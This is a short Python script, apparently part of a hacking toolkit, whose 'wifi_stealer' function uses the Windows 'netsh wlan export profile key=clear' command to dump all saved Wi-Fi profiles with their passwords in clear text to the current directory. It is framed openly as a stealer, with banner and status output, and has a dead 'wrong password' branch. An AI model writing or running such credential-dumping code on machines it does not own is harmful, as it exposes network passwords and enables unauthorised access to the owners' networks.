import subprocess
import time
import os
from colored import bg, fg, attr

green = fg("green")
blue = fg("blue")
red = fg("red")


def wifi_stealer():
    print(" ")
    print(blue + "-" * 88)
    print("WIFI STEALER")
    print("-" * 88)

    path = os.getcwd()

    try:
        d = True
        if d == True:
            a = subprocess.run("netsh wlan export profile" + " key=clear folder=" + str(path), capture_output=True,
                               text=True)
            print(a.stdout)
            a = os.getcwd()
            print(" ")
            print(green + "[#] Exported files saved in " + str(a))
            time.sleep(3)
        else:
            print(red + "[-] Wrong password... ")
            time.sleep(3)
    except:
        print(" ")
        print(red + "[+] Make sure you are using a WINDOWS Operating system")